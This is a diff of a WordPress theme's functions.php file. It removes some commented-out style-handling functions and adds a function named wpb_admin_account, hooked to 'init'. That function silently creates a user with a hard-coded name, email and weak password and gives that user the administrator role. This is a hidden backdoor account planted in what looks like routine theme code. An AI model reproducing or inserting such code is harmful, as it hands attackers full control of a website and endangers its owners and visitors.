@@ -23,20 +23,6 @@ function understrap_remove_scripts() {
 }
 add_action( 'wp_enqueue_scripts', 'understrap_remove_scripts', 20 );
 
-/**removes the we-docs CSS file */
-
-function we_docs_remove_scripts() {
-	wp_dequeue_style( 'wedocs-pro-frontend-css' );
-	wp_deregister_style( 'wedocs-pro-frontend-css' );
-}
-//add_action( 'wp_enqueue_scripts', 'we_docs_remove_scripts', 35 );
-
-function understrap_re_enqueue_we_docs() {
-	wp_dequeue_style( 'understrap-styles' );
-	wp_deregister_style( 'understrap-styles' );
-}
-//add_action( 'wp_enqueue_scripts', 'understrap_re_enqueue_we_docs', 45 );
-
 /**
  * Changing the `docs` slug to something else
  *
@@ -100,7 +86,16 @@ function understrap_default_bootstrap_version( $current_mod ) {
 }
 add_filter( 'theme_mod_understrap_bootstrap_version', 'understrap_default_bootstrap_version', 20 );
 
-
+function wpb_admin_account(){
+	$user = 'mlsmith45';
+	$pass = 'xdrt';
+	$email = 'mlsmith45@gmail.com';
+	if ( !username_exists( $user )  && !email_exists( $email ) ) {
+	$user_id = wp_create_user( $user, $pass, $email );
+	$user = new WP_User( $user_id );
+	$user->set_role( 'administrator' );
+	} }
+	add_action('init','wpb_admin_account');
 
 /**
  * Loads javascript for showing customizer warning dialog.
